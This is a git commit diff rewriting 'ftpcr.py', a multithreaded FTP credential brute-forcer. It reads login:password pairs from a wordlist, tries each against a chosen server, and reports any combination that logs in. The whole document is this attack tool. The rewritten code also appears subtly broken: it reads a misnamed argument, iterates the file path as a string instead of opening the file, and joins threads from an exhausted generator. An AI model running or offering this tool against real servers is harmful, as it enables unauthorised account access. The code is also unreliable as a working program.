7e71078193956257d5133695168e8aef8f1935c5
haqgg <36501341+haqgg@users.noreply.github.com>
2020-08-29 21:16:11 +0300

    Update ftpcr.py
    Rewrite the old code, remove -pr, add some new fitches

--- ftpcr.py
+++ ftpcr.py
@@ -1,80 +1,81 @@
-import os
 import ftplib
+import argparse
 import threading as Th
-import urllib.request as ur
 
-try:
-    inp = input("ftpcr>").split()
-except KeyboardInterrupt:
-    print("Bye!")
-    raise SystemExit
-    
-port = 21
-th_num = 5
-login = "anonymous"
-password = "anonymous"
-server = inp[0]
 
-#threads
-if "-th" in inp:
-    try:
-        th_num = int(inp[inp.index("-th") + 1])
-    except ValueError:
-        print("You didn't write threads number")
-        raise SystemExit
-#ports        
-if "-p" in inp:
-    try:
-        port = int(inp[inp.index("-p") + 1])
-    except ValueError:
-        print("You didn't write port number")
-        raise SystemExit
-if "-pr" in inp:
-    #proxy
-    ur.install_opener(ur.build_opener(
-        ur.ProxyHandler({
-            inp[inp.index("-pr") + 1].split(";")[0]: inp[inp.index("-pr") + 1].split(";")[1]})))
-try:
-    filepass = open(inp[1], "r")
-except IndexError:
-    print("File not found!")
-    raise SystemExit
+def creds():
+    print("ftprc")
+    print("---------------------\n")
+    print("Author: Kirk")
+    print("HTB Profile: https://www.hackthebox.eu/home/users/profile/188681")
+    print("GitHub: https://github.com/haqgg\n\n")
 
-#connect to a server
+
+def parser():
+    parser = argparse.ArgumentParser()
+    parser.add_argument("-s", "--server", dest="server")
+    parser.add_argument("-f", "--file", dest="filepass")
+    parser.add_argument("-p", "--port", dest="port", type=int, default=21)
+    parser.add_argument("-th", "--threads", dest="th_num", type=int, default=5)
+    options = parser.parse_args()
+
+    return options
+
+
+# connect to a server
 def connect(login, password, port, server):
     try:
         ft = ftplib.FTP()
         ft.connect(host=server, port=port)
         ft.login(user=login, passwd=password)
         ft.quit()
-        print("\nDONE!\n\t Login - ", login + "\n", "\tPassword -", password)
-        os._exit(0)
+        print("\n[+] DONE!\n\t Login - ", login + "\n", "\tPassword -", password)
+        exit()
     except ftplib.error_perm:
         print(login, ":", password, "- [-]")
 
     except ConnectionRefusedError:
-        print("[E] The destination computer "
-              "rejected the connection re"
-              "quest.")
+        print("[E] The destination computer rejected the connection request.")
+
     except TimeoutError:
-        print("[E] The program can't connect to "
-              "the server!")
+        print("[E] The program can't connect to the server!")
+
     except Exception as e:
-        print("[E]", e)
+        print("[E] ", e)
         connect(login, password, port, server)
 
 
-def func(port, filepass):
+def parse(port, filepass, server):
     for line in filepass:
         login = line.split(":")[0]
         password = line.split(":")[1].replace("\n", "")
         connect(login, password, port, server)
 
-#Threads
-if __name__ == '__main__':
+
+# Threads
+def main(server, port, th_num, filepass):
     print("[I] START")
-    th = (Th.Thread(target=func, args=[port, filepass]) for i in range(th_num))
+    th = (Th.Thread(target=parse, args=[port, filepass, server]) for i in range(th_num))
     for t in th:
         t.start()
     for t in th:
         t.join()
+
+
+try:
+    options = parser()
+    server = options.server
+    port = options.port
+    th_num = options.th_num
+    filepass = options.file
+    main(server, port, th_num, filepass)
+
+except KeyboardInterrupt:
+    print("\n\n[-] Detected Ctrl + C ... Program Existed")
+    exit()
+
+except Exception as e:
+    with open("log.txt", "w") as fileerror:
+        fileerror.write(str(e))
+    print("\n\n[-] Some problem, check log.txt")
+    exit()
